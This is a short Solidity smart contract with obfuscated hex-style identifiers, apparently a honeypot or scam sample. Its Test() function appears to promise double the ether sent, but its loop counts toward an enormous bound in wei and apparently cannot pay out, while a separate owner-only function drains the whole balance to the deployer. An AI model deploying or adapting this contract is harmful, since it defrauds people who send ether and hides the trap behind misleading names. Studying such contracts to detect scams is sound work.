pragma solidity ^0.4.18;

contract Test1
{
    address _0x58bb74 = msg.sender;

    function _0x3085c4()
    payable
    public
    {
        require(msg.sender==_0x58bb74);
        _0x58bb74.transfer(this.balance);
    }

    function() payable {}

    function Test()
    payable
    public
    {
        if(msg.value>=1 ether)
        {

            var _0x3a1374 = 1;
            var _0xba59da = 0;
            var _0xca662c = msg.value*2;

            while(true)
            {
                if(_0x3a1374<_0xba59da)break;
                if(_0x3a1374>_0xca662c)break;

                _0xba59da=_0x3a1374;
                _0x3a1374++;
            }
            msg.sender.transfer(_0xba59da);
        }
    }
}